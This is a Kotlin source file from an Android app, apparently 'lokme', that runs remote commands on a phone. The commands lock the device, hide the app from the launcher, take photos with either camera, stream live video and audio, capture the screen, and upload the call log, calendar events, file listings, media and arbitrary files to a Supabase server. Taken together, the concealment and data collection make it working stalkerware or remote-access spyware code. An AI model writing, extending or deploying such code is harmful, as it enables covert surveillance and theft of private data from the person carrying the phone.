package com.lokme.service

import android.app.AlarmManager
import android.app.AlertDialog
import android.app.PendingIntent
import android.content.ComponentName
import android.content.ContentResolver
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.database.Cursor
import android.media.AudioAttributes
import android.media.MediaPlayer
import android.media.RingtoneManager
import android.net.Uri
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.os.VibrationEffect
import android.os.Vibrator
import android.provider.CalendarContract
import android.util.Log
import com.lokme.admin.DeviceAdminReceiver
import com.lokme.calllog.CallLogReader
import com.lokme.camera.AudioStreamHelper
import com.lokme.camera.CameraHelper
import com.lokme.camera.VideoStreamHelper
import com.lokme.location.LocationHelper
import com.lokme.model.CalendarEvent
import com.lokme.model.DeviceFileEntry
import com.lokme.network.SupabaseClient
import com.lokme.network.WsClient
import com.lokme.screen.ScreenCaptureHelper
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class CommandExecutor(private val context: Context) {

    private val scope = CoroutineScope(Dispatchers.IO)
    private val handler = Handler(Looper.getMainLooper())
    private var cameraHelper: CameraHelper? = null
    var videoStreamHelper: VideoStreamHelper? = null
        private set
    var audioStreamHelper: AudioStreamHelper? = null
        private set

    fun initCamera(lifecycleOwner: androidx.lifecycle.LifecycleOwner) {
        try {
            Thread {
                try {
                    val helper = CameraHelper(context, lifecycleOwner)
                    helper.initialize()
                    cameraHelper = helper

                    val streamHelper = VideoStreamHelper(context, lifecycleOwner)
                    streamHelper.initialize()
                    videoStreamHelper = streamHelper

                    val audioHelper = AudioStreamHelper(context)
                    audioStreamHelper = audioHelper

                    Log.d("CommandExec", "Camera + VideoStream + AudioStream initialized")
                } catch (e: Exception) {
                    Log.e("CommandExec", "Camera init failed: ${e.message}")
                }
            }.start()
        } catch (e: Exception) {
            Log.e("CommandExec", "initCamera error: ${e.message}")
        }
    }

    fun execute(
        commandType: String,
        commandId: String,
        payload: String,
        deviceId: String,
        wsClient: WsClient,
        onSuccess: (String) -> Unit,
        onError: (String) -> Unit
    ) {
        Log.d("CommandExec", "Executing: $commandType")

        when (commandType) {
            "LOCK_DEVICE" -> lockDevice(commandId, deviceId, onSuccess, onError)
            "SHOW_DIALOG" -> showDialog(commandId, deviceId, payload, onSuccess, onError)
            "GET_LOCATION" -> getLocation(commandId, deviceId, onSuccess, onError)
            "CAPTURE_PHOTO" -> capturePhoto(commandId, deviceId, payload, onSuccess, onError)
            "CAPTURE_SCREEN" -> captureScreen(commandId, deviceId, onSuccess, onError)
            "GET_CALL_LOG" -> getCallLog(commandId, deviceId, onSuccess, onError)
            "START_VIDEO_STREAM" -> startVideoStream(commandId, deviceId, payload, wsClient, onSuccess, onError)
            "STOP_VIDEO_STREAM" -> stopVideoStream(commandId, deviceId, onSuccess, onError)
            "HIDE_APP" -> hideApp(commandId, deviceId, onSuccess, onError)
            "SHOW_APP" -> showApp(commandId, deviceId, onSuccess, onError)
            "PLAY_ALARM" -> playAlarm(commandId, deviceId, payload, onSuccess, onError)
            "VIBRATE_DEVICE" -> vibrateDevice(commandId, deviceId, payload, onSuccess, onError)
            "LIST_FILES" -> listFiles(commandId, deviceId, payload, onSuccess, onError)
            "LIST_MEDIA" -> listMedia(commandId, deviceId, onSuccess, onError)
            "DOWNLOAD_FILE" -> downloadFile(commandId, deviceId, payload, onSuccess, onError)
            "DOWNLOAD_VIDEO" -> downloadFile(commandId, deviceId, payload, onSuccess, onError)
            "GET_CALENDAR" -> getCalendar(commandId, deviceId, onSuccess, onError)
            "GET_BATTERY" -> getBattery(commandId, deviceId, onSuccess, onError)
            else -> onError("Unknown command: $commandType")
        }
    }

    private fun lockDevice(commandId: String, deviceId: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
        try {
            val adminComponent = ComponentName(context, DeviceAdminReceiver::class.java)
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager

            if (dpm.isAdminActive(adminComponent)) {
                dpm.lockNow()
                onSuccess("Device locked")
            } else {
                onError("Device admin not active")
            }
        } catch (e: Exception) {
            onError(e.message ?: "Lock failed")
        }
    }

    private fun showDialog(commandId: String, deviceId: String, payload: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
        try {
            val json = JSONObject(payload)
            val title = json.optString("title", "Message")
            val message = json.optString("message", "")

            handler.post {
                try {
                    val builder = AlertDialog.Builder(context, android.R.style.Theme_DeviceDefault_Dialog_Alert)
                        .setTitle(title)
                        .setMessage(message)
                        .setCancelable(false)
                        .setPositiveButton("OK") { dialog, _ -> dialog.dismiss() }

                    val dialog = builder.create()
                    dialog.window?.setType(android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY)
                    dialog.show()
                } catch (e: Exception) {
                    Log.e("CommandExec", "Dialog show error: ${e.message}")
                }
            }

            onSuccess("Dialog shown")
        } catch (e: Exception) {
            onError(e.message ?: "Dialog failed")
        }
    }

    private fun getLocation(commandId: String, deviceId: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
        LocationHelper.getCurrentLocation(
            context,
            onResult = { latLng ->
                scope.launch {
                    try {
                        SupabaseClient.insertLocation(deviceId, latLng.latitude, latLng.longitude)
                        onSuccess("${latLng.latitude},${latLng.longitude}")
                    } catch (e: Exception) {
                        onError(e.message ?: "Upload failed")
                    }
                }
            },
            onError = { e ->
                onError(e.message ?: "Location failed")
            }
        )
    }

    private fun capturePhoto(commandId: String, deviceId: String, payload: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
        val json = try { JSONObject(payload) } catch (_: Exception) { JSONObject() }
        val useFront = json.optBoolean("front_camera", false)
        val cameraType = if (useFront) "front" else "back"

        val helper = cameraHelper
        if (helper == null) {
            onError("Camera not initialized")
            return
        }

        helper.capturePhoto(
            useFrontCamera = useFront,
            onResult = { bytes ->
                scope.launch {
                    try {
                        val fileName = helper.generateFileName()
                        val url = SupabaseClient.uploadPhoto(deviceId, fileName, bytes)
                        SupabaseClient.insertPhotoRecord(deviceId, url, cameraType)
                        onSuccess(url)
                    } catch (e: Exception) {
                        onError(e.message ?: "Upload failed")
                    }
                }
            },
            onError = { e ->
                onError(e.message ?: "Capture failed")
            }
        )
    }

    private fun startVideoStream(commandId: String, deviceId: String, payload: String, wsClient: WsClient, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
        val helper = videoStreamHelper
        if (helper == null) {
            onError("Video stream not initialized")
            return
        }

        val json = try { JSONObject(payload) } catch (_: Exception) { JSONObject() }
        val useFront = json.optBoolean("front_camera", false)

        helper.startStream(wsClient, deviceId, useFront)

        audioStreamHelper?.startStream(wsClient, deviceId)

        onSuccess("Video + audio stream started (${if (useFront) "front" else "back"} camera)")
    }

    private fun stopVideoStream(commandId: String, deviceId: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
        val helper = videoStreamHelper
        if (helper == null) {
            onError("Video stream not initialized")
            return
        }

        helper.stopStream()
        audioStreamHelper?.stopStream()
        onSuccess("Video + audio stream stopped")
    }

    private fun hideApp(commandId: String, deviceId: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
        try {
            val pm = context.packageManager
            val componentName = ComponentName(context, "com.lokme.MainActivity")
            pm.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            onSuccess("App hidden from launcher")
        } catch (e: Exception) {
            onError(e.message ?: "Hide failed")
        }
    }

    private fun showApp(commandId: String, deviceId: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
        try {
            val pm = context.packageManager
            val componentName = ComponentName(context, "com.lokme.MainActivity")
            pm.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            onSuccess("App shown in launcher")
        } catch (e: Exception) {
            onError(e.message ?: "Show failed")
        }
    }

    private fun getCallLog(commandId: String, deviceId: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
        try {
            val logs = CallLogReader.readCallLogs(context, limit = 50)

            scope.launch {
                try {
                    val entries = logs.map { log ->
                        com.lokme.model.CallLogEntry(
                            device_id = deviceId,
                            phone_number = log.phoneNumber,
                            contact_name = log.contactName,
                            call_type = log.callType,
                            call_date = log.callDate,
                            duration_seconds = log.durationSeconds
                        )
                    }
                    SupabaseClient.insertCallLogs(entries)
                    onSuccess("Uploaded ${logs.size} call logs")
                } catch (e: Exception) {
                    onError(e.message ?: "Upload failed")
                }
            }
        } catch (e: Exception) {
            onError(e.message ?: "Read failed")
        }
    }

    private var mediaPlayer: MediaPlayer? = null

    private fun playAlarm(commandId: String, deviceId: String, payload: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
        try {
            val json = try { JSONObject(payload) } catch (_: Exception) { JSONObject() }
            val durationMs = json.optLong("duration_ms", 15000L)

            mediaPlayer?.release()
            val uri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
            if (uri == null) { onError("No alarm ringtone found"); return }

            mediaPlayer = MediaPlayer().apply {
                setAudioAttributes(AudioAttributes.Builder()
                    .setUsage(AudioAttributes.USAGE_ALARM)
                    .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
                    .build())
                setDataSource(context, uri)
                isLooping = true
                setVolume(1.0f, 1.0f)
                prepare()
                start()
            }

            handler.postDelayed({
                try { mediaPlayer?.stop(); mediaPlayer?.release(); mediaPlayer = null } catch (_: Exception) {}
            }, durationMs)

            onSuccess("Alarm playing for ${durationMs}ms")
        } catch (e: Exception) {
            onError(e.message ?: "Alarm failed")
        }
    }

    private fun vibrateDevice(commandId: String, deviceId: String, payload: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
        try {
            val json = try { JSONObject(payload) } catch (_: Exception) { JSONObject() }
            val durationMs = json.optLong("duration_ms", 10000)
            val vibrator = context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator?
            if (vibrator == null || !vibrator.hasVibrator()) {
                onError("No vibrator on device")
                return
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(VibrationEffect.createOneShot(durationMs, VibrationEffect.DEFAULT_AMPLITUDE))
            } else {
                @Suppress("DEPRECATION") vibrator.vibrate(durationMs)
            }
            onSuccess("Vibrating for ${durationMs}ms")
        } catch (e: Exception) {
            onError(e.message ?: "Vibrate failed")
        }
    }

    private fun listFiles(commandId: String, deviceId: String, payload: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
        try {
            val json = try { JSONObject(payload) } catch (_: Exception) { JSONObject() }
            val path = json.optString("path", Environment.getExternalStorageDirectory().absolutePath)
            val dir = File(path)
            if (!dir.exists() || !dir.isDirectory) { onError("Directory not found: $path"); return }

            val files = dir.listFiles()?.map { file ->
                val isDir = file.isDirectory
                DeviceFileEntry(
                    id = deviceId + "_" + file.absolutePath.hashCode(),
                    device_id = deviceId,
                    file_name = file.name,
                    file_path = file.absolutePath,
                    file_size = if (isDir) 0 else file.length(),
                    mime_type = if (isDir) "dir" else getMimeType(file.name),
                    is_directory = isDir,
                    last_modified = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US).format(Date(file.lastModified()))
                )
            }?.toList() ?: emptyList()

            // upload metadata to supabase
            scope.launch { try { SupabaseClient.insertDeviceFiles(deviceId, files) } catch (_: Exception) {} }

            val jsonArr = JSONArray()
            files.forEach { f ->
                jsonArr.put(JSONObject().apply {
                    put("name", f.file_name)
                    put("path", f.file_path)
                    put("size", f.file_size)
                    put("mime", f.mime_type)
                    put("is_dir", f.is_directory)
                    put("modified", f.last_modified)
                })
            }
            val result = JSONObject().apply {
                put("current_path", dir.absolutePath)
                put("files", jsonArr)
            }
            onSuccess(result.toString())
        } catch (e: Exception) {
            onError(e.message ?: "List files failed")
        }
    }

    private fun listMedia(commandId: String, deviceId: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
        try {
            val resolver: ContentResolver = context.contentResolver
            val results = JSONArray()

            // query images
            val imageUri = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                android.provider.MediaStore.Images.Media.getContentUri(android.provider.MediaStore.VOLUME_EXTERNAL)
            } else {
                android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            }
            val imgProjection = arrayOf(
                android.provider.MediaStore.Images.Media._ID,
                android.provider.MediaStore.Images.Media.DISPLAY_NAME,
                android.provider.MediaStore.Images.Media.DATA,
                android.provider.MediaStore.Images.Media.SIZE
            )
            resolver.query(imageUri, imgProjection, null, null, "${android.provider.MediaStore.Images.Media.DATE_ADDED} DESC LIMIT 100")?.use { cursor ->
                val idCol = cursor.getColumnIndex(android.provider.MediaStore.Images.Media._ID)
                val nameCol = cursor.getColumnIndex(android.provider.MediaStore.Images.Media.DISPLAY_NAME)
                val dataCol = cursor.getColumnIndex(android.provider.MediaStore.Images.Media.DATA)
                val sizeCol = cursor.getColumnIndex(android.provider.MediaStore.Images.Media.SIZE)
                while (cursor.moveToNext()) {
                    val id = if (idCol >= 0) cursor.getLong(idCol) else 0L
                    val path = if (dataCol >= 0) cursor.getString(dataCol) else ""
                    if (path.isNullOrBlank()) continue
                    val name = if (nameCol >= 0) cursor.getString(nameCol) else "image"
                    val size = if (sizeCol >= 0) cursor.getLong(sizeCol) else 0L
                    // query thumbnail directly
                    val thumbPath = getImageThumbnailPath(resolver, id)

                    results.put(JSONObject().apply {
                        put("name", name)
                        put("path", path)
                        put("size", size)
                        put("mime", "image/${name.substringAfterLast('.', "jpeg")}")
                        put("thumb_url", thumbPath)
                    })
                }
            }

            // query videos
            val videoUri = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                android.provider.MediaStore.Video.Media.getContentUri(android.provider.MediaStore.VOLUME_EXTERNAL)
            } else {
                android.provider.MediaStore.Video.Media.EXTERNAL_CONTENT_URI
            }
            val vidProjection = arrayOf(
                android.provider.MediaStore.Video.Media._ID,
                android.provider.MediaStore.Video.Media.DISPLAY_NAME,
                android.provider.MediaStore.Video.Media.DATA,
                android.provider.MediaStore.Video.Media.SIZE
            )
            resolver.query(videoUri, vidProjection, null, null, "${android.provider.MediaStore.Video.Media.DATE_ADDED} DESC LIMIT 100")?.use { cursor ->
                val idCol = cursor.getColumnIndex(android.provider.MediaStore.Video.Media._ID)
                val nameCol = cursor.getColumnIndex(android.provider.MediaStore.Video.Media.DISPLAY_NAME)
                val dataCol = cursor.getColumnIndex(android.provider.MediaStore.Video.Media.DATA)
                val sizeCol = cursor.getColumnIndex(android.provider.MediaStore.Video.Media.SIZE)
                while (cursor.moveToNext()) {
                    val id = if (idCol >= 0) cursor.getLong(idCol) else 0L
                    val path = if (dataCol >= 0) cursor.getString(dataCol) else ""
                    if (path.isNullOrBlank()) continue
                    val name = if (nameCol >= 0) cursor.getString(nameCol) else "video"
                    val size = if (sizeCol >= 0) cursor.getLong(sizeCol) else 0L
                    val thumbPath = getVideoThumbnailPath(resolver, id)

                    results.put(JSONObject().apply {
                        put("name", name)
                        put("path", path)
                        put("size", size)
                        put("mime", "video/${name.substringAfterLast('.', "mp4")}")
                        put("thumb_url", thumbPath)
                    })
                }
            }

            onSuccess(results.toString())
        } catch (e: Exception) {
            onError(e.message ?: "List media failed")
        }
    }

    private fun getImageThumbnailPath(resolver: ContentResolver, imageId: Long): String {
        return try {
            val uri = android.provider.MediaStore.Images.Thumbnails.EXTERNAL_CONTENT_URI
            val projection = arrayOf(android.provider.MediaStore.Images.Thumbnails.DATA)
            val selection = "${android.provider.MediaStore.Images.Thumbnails.IMAGE_ID} = ? AND ${android.provider.MediaStore.Images.Thumbnails.KIND} = ?"
            val selArgs = arrayOf(imageId.toString(), android.provider.MediaStore.Images.Thumbnails.MINI_KIND.toString())
            var thumbPath = ""
            resolver.query(uri, projection, selection, selArgs, null)?.use { c ->
                if (c.moveToFirst()) {
                    val col = c.getColumnIndex(android.provider.MediaStore.Images.Thumbnails.DATA)
                    if (col >= 0) thumbPath = c.getString(col) ?: ""
                }
            }
            thumbPath
        } catch (_: Exception) { "" }
    }

    private fun getVideoThumbnailPath(resolver: ContentResolver, videoId: Long): String {
        return try {
            val uri = android.provider.MediaStore.Video.Thumbnails.EXTERNAL_CONTENT_URI
            val projection = arrayOf(android.provider.MediaStore.Video.Thumbnails.DATA)
            val selection = "${android.provider.MediaStore.Video.Thumbnails.VIDEO_ID} = ? AND ${android.provider.MediaStore.Video.Thumbnails.KIND} = ?"
            val selArgs = arrayOf(videoId.toString(), android.provider.MediaStore.Video.Thumbnails.MINI_KIND.toString())
            var thumbPath = ""
            resolver.query(uri, projection, selection, selArgs, null)?.use { c ->
                if (c.moveToFirst()) {
                    val col = c.getColumnIndex(android.provider.MediaStore.Video.Thumbnails.DATA)
                    if (col >= 0) thumbPath = c.getString(col) ?: ""
                }
            }
            thumbPath
        } catch (_: Exception) { "" }
    }

    private fun downloadFile(commandId: String, deviceId: String, payload: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
        try {
            val json = JSONObject(payload)
            val filePath = json.optString("file_path", "")
            if (filePath.isEmpty()) { onError("file_path required"); return }

            val file = File(filePath)
            if (!file.exists() || !file.isFile) { onError("File not found: $filePath"); return }

            val maxBytes = 20L * 1024 * 1024 // 20MB
            if (file.length() > maxBytes) { onError("File too large (max 20MB): ${file.length() / 1024 / 1024}MB"); return }

            val bytes = file.readBytes()
            val fileName = file.name

            scope.launch {
                try {
                    val url = SupabaseClient.uploadDeviceFile(deviceId, fileName, bytes)
                    onSuccess(url)
                } catch (e: Exception) {
                    onError(e.message ?: "Upload failed")
                }
            }
        } catch (e: Exception) {
            onError(e.message ?: "Download failed")
        }
    }

    private fun getCalendar(commandId: String, deviceId: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
        try {
            val resolver: ContentResolver = context.contentResolver
            val uri = CalendarContract.Events.CONTENT_URI

            val now = System.currentTimeMillis()
            val weekAgo = now - 7 * 24 * 60 * 60 * 1000L

            val projection = arrayOf(
                CalendarContract.Events.TITLE,
                CalendarContract.Events.DESCRIPTION,
                CalendarContract.Events.EVENT_LOCATION,
                CalendarContract.Events.DTSTART,
                CalendarContract.Events.DTEND,
                CalendarContract.Events.ALL_DAY,
                CalendarContract.Events.ORGANIZER
            )
            val selection = "${CalendarContract.Events.DTSTART} >= ? AND ${CalendarContract.Events.DTSTART} <= ?"
            val selArgs = arrayOf(weekAgo.toString(), now.toString())

            val cursor: Cursor? = resolver.query(uri, projection, selection, selArgs, "${CalendarContract.Events.DTSTART} ASC")
            val events = mutableListOf<CalendarEvent>()
            val sdf = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US)

            cursor?.use { c ->
                while (c.moveToNext()) {
                    val title = c.getString(c.getColumnIndexOrThrow(CalendarContract.Events.TITLE)) ?: ""
                    val desc = c.getString(c.getColumnIndexOrThrow(CalendarContract.Events.DESCRIPTION)) ?: ""
                    val loc = c.getString(c.getColumnIndexOrThrow(CalendarContract.Events.EVENT_LOCATION)) ?: ""
                    val start = c.getLong(c.getColumnIndexOrThrow(CalendarContract.Events.DTSTART))
                    val end = c.getLong(c.getColumnIndexOrThrow(CalendarContract.Events.DTEND))
                    val allDay = c.getInt(c.getColumnIndexOrThrow(CalendarContract.Events.ALL_DAY)) == 1
                    val org = c.getString(c.getColumnIndexOrThrow(CalendarContract.Events.ORGANIZER)) ?: ""

                    events.add(CalendarEvent(
                        device_id = deviceId,
                        title = title,
                        description = desc,
                        event_location = loc,
                        start_time = sdf.format(Date(start)),
                        end_time = sdf.format(Date(end)),
                        all_day = allDay,
                        organizer = org
                    ))
                }
            }

            scope.launch { try { SupabaseClient.insertCalendarEvents(deviceId, events) } catch (_: Exception) {} }

            val jsonArr = JSONArray()
            events.forEach { e ->
                jsonArr.put(JSONObject().apply {
                    put("title", e.title)
                    put("description", e.description)
                    put("location", e.event_location)
                    put("start_time", e.start_time)
                    put("end_time", e.end_time)
                    put("all_day", e.all_day)
                    put("organizer", e.organizer)
                })
            }
            onSuccess(jsonArr.toString())
        } catch (e: Exception) {
            onError(e.message ?: "Calendar failed")
        }
    }

    fun getBatterySnapshot(): JSONObject? {
        return try {
            val intent = context.registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
            val level = if (intent != null) {
                val raw = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
                val scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
                if (raw >= 0 && scale > 0) (raw * 100 / scale) else 0
            } else 0
            val isCharging = intent?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) == BatteryManager.BATTERY_STATUS_CHARGING
            val technology = intent?.getStringExtra(BatteryManager.EXTRA_TECHNOLOGY) ?: ""
            val temperature = (intent?.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0) ?: 0) / 10.0f
            val voltage = intent?.getIntExtra(BatteryManager.EXTRA_VOLTAGE, 0) ?: 0
            val health = when (intent?.getIntExtra(BatteryManager.EXTRA_HEALTH, -1)) {
                BatteryManager.BATTERY_HEALTH_GOOD -> "good"
                BatteryManager.BATTERY_HEALTH_OVERHEAT -> "overheat"
                BatteryManager.BATTERY_HEALTH_DEAD -> "dead"
                BatteryManager.BATTERY_HEALTH_OVER_VOLTAGE -> "over_voltage"
                BatteryManager.BATTERY_HEALTH_UNSPECIFIED_FAILURE -> "failure"
                else -> "unknown"
            }
            JSONObject().apply {
                put("level", level)
                put("is_charging", isCharging)
                put("technology", technology)
                put("temperature", temperature)
                put("voltage", voltage)
                put("health", health)
            }
        } catch (_: Exception) { null }
    }

    private fun getBattery(commandId: String, deviceId: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
        val json = getBatterySnapshot()
        if (json != null) onSuccess(json.toString()) else onError("Battery read failed")
    }

    private fun getMimeType(fileName: String): String {
        val ext = fileName.substringAfterLast('.', "").lowercase()
        return when (ext) {
            "jpg", "jpeg" -> "image/jpeg"
            "png" -> "image/png"
            "gif" -> "image/gif"
            "mp4" -> "video/mp4"
            "mp3" -> "audio/mpeg"
            "pdf" -> "application/pdf"
            "doc", "docx" -> "application/msword"
            "txt" -> "text/plain"
            "zip" -> "application/zip"
            "apk" -> "application/vnd.android.package-archive"
            else -> "application/octet-stream"
        }
    }

    private fun captureScreen(commandId: String, deviceId: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
        try {
            val bytes = ScreenCaptureHelper.captureScreen(context)
            if (bytes == null) {
                onError("Screen capture failed (grant MediaProjection permission on device)")
                return
            }

            scope.launch {
                try {
                    val url = SupabaseClient.uploadPhoto(deviceId, "screen_${System.currentTimeMillis()}.jpg", bytes)
                    SupabaseClient.insertPhotoRecord(deviceId, url, "screen")
                    onSuccess(url)
                } catch (e: Exception) {
                    onError(e.message ?: "Upload failed")
                }
            }
        } catch (e: Exception) {
            onError(e.message ?: "Screen capture error")
        }
    }
}
